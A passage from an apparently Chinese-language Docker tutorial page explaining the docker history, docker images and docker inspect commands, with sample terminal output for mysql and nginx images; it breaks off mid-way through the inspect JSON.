id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的历史提交记录信息</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql               <br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB   <br></code></pre></td></tr></table></figure><h4 id="OPTIONS-2"><a href="#OPTIONS-2" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h5><p>以可读的方式展示时间镜像信息和时间，默认开启</p><h5 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h5><p>仅列出提交记录ID</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  /tmp docker <span class="hljs-keyword">history</span> -q mysql<br>de7c37d1d5ac<br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br></code></pre></td></tr></table></figure><h5 id="–no-trunc-1"><a href="#–no-trunc-1" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整信息</p><h4 id="images"><a href="#images" class="headerlink" title="images"></a>images</h4><p>image ID 或REPOSITORY:TAG</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker images<br>REPOSITORY                TAG          IMAGE ID       CREATED         SIZE<br>grafana/grafana           10.2.4       147eb932c0fd  <span class="hljs-number"> 10 </span>days ago     391MB<br>mysql                     8.3.0        e68e2614955c  <span class="hljs-number"> 5 </span>weeks ago     638MB<br>apache/activemq-artemis   latest       76998b3399b7  <span class="hljs-number"> 3 </span>months ago    312MB<br>lamp_web                  latest       41d9dabcb737  <span class="hljs-number"> 6 </span>months ago    524MB<br>mysql                     latest       de7c37d1d5ac  <span class="hljs-number"> 6 </span>months ago    599MB<br>ubuntu                    latest       4c2c87c6c36e  <span class="hljs-number"> 14 </span>months ago   69.2MB<br>kalilinux/kali-rolling    latest       0d323592c7f5  <span class="hljs-number"> 14 </span>months ago   140MB<br>centos                   <span class="hljs-number"> 7 </span>           c9a1fdca3387  <span class="hljs-number"> 2 </span>years ago     301MB<br>nginx                     latest       eeb9db34b331  <span class="hljs-number"> 2 </span>years ago     134MB<br>php                       7.4.21-fpm   1829ff0bdd88  <span class="hljs-number"> 2 </span>years ago     364MB<br>vulhub/flink              1.11.2       b137254280cc  <span class="hljs-number"> 3 </span>years ago     625MB<br>islandora/activemq        latest       5d0bce1752d7  <span class="hljs-number"> 3 </span>years ago     272MB<br>webcenter/activemq        latest       3af156432993  <span class="hljs-number"> 7 </span>years ago     422MB<br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql<br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB     <br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  /tmp docker history mysql:<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><br>IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT<br>e68e2614955c   <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;mysqld&quot;</span>]                                  0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">EXPOSE</span> map[<span class="hljs-number">3306</span>/tcp:&#123;&#125; <span class="hljs-number">33060</span>/tcp:&#123;&#125;]            <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]             0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">COPY</span><span class="language-bash"> docker-entrypoint.sh /usr/local/bin/ <span class="hljs-comment"># …   13.5kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [/var/lib/mysql]                         0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eux;  microdnf install -…   303MB     buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_SHELL_VERSION=<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.el8             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eu;  &#123;   <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[mysql-to…   226B      buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  microdnf install -…   197MB     buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eu;  &#123;   echo &#x27;</span>[mysqlinn…   246B      buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_VERSION=<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.el8                   <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_MAJOR=innovation                      <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eux;  key=<span class="hljs-string">&#x27;BCA4 3417 C3B…   3.17kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  microdnf install -…   14MB      buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;…   2.4MB     buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> GOSU_VERSION=<span class="hljs-number">1.16</span>                           <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  groupadd --system …   2.77kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   /bin/sh -c <span class="hljs-comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   /bin/sh -c <span class="hljs-comment">#(nop) ADD file:53c58659a3a149d31…   122MB   </span><br></code></pre></td></tr></table></figure><h2 id="查看镜像元数据"><a href="#查看镜像元数据" class="headerlink" title="查看镜像元数据"></a>查看镜像元数据</h2><h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的基础数据</p><h4 id="OPTIONS-3"><a href="#OPTIONS-3" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  /tmp docker images <span class="hljs-string">| grep nginx</span><br>nginx                     latest       eeb9db34b331   <span class="hljs-number">2</span> years ago     <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  /<span class="hljs-variable">tmp</span> <span class="hljs-variable">docker</span> inspect <span class="hljs-variable">nginx</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;sha256:eeb9db34b33190cac170b27d857e9b23511d396a2609c1a54e93025634afed0a&quot;</span>,<br>        <span class="hljs-string">&quot;RepoTags&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx:latest&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;RepoDigests&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;Parent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Comment&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2021-12-29T18:45:32.26799474Z&quot;</span>,<br>        <span class="hljs-string">&quot;Container&quot;</span>: <span class="hljs-string">&quot;28117e6cd07462919e64874c17cec15a453e5b3d99b088f04a12a7640c27c280&quot;</span>,<br>        <span class="hljs-string">&quot;ContainerConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;28117e6cd074&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;#(nop) &quot;</span>,<br>                <span class="hljs-string">&quot;CMD [<span class="hljs-char escape_">\&quot;</span>nginx<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>-g<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>daemon off;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;DockerVersion&quot;</span>: <span class="hljs-string">&quot;20.10.7&quot;</span>,<br>        <span class="hljs-string">&quot;Author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;nginx&quot;</span>,<br>                <span class="hljs-string">&quot;-g&quot;</span>,<br>                <span class="hljs-string">&quot;daemon off;&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Architecture&quot;</span>: <span class="hljs-string">&quot;arm64&quot;</span>,<br>        <span class="hljs-string">&quot;Variant&quot;</span>: <span class="hljs-string">&quot;v8&quot;</span>,<br>        <span class="hljs-string">&quot;Os&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;Size&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;VirtualSize&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/19bce005f2b1d9db0eba7c613875f51cd1b7a19ea0a43dcbf45c1017fbcc03dc/diff:/var/lib/docker/overlay2/2949cec29c3a2dfba7a1cbc215919f6ec18a27e80506dbbc51017f4389bb604e/diff:/var/lib/docker/overlay2/8f23aefbf0d9446e0dd6f9d228bdd2ed21b4b556d064352cdb546407fbe22b7b/diff:/var/lib/docker/overlay2/aba312ecee136814284e1d21b2d4f6c28cdabb85ee4d3142324ae752156359ac/diff:/var/lib/docker/overlay2/3db4264e94b91b2dac969fd2a0af7317aeb303e8d0032162e2e4734c05b750c9/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span 